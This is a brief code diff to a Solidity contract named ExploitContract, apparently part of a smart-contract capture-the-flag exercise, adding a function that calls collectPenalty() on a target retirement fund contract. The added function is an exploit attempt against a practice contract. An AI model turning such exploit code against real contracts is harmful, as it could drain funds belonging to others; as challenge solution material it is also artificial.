@@ -58,4 +58,7 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    function Exploiter() external payable {
+        retirementFund.collectPenalty();
+    }
 }
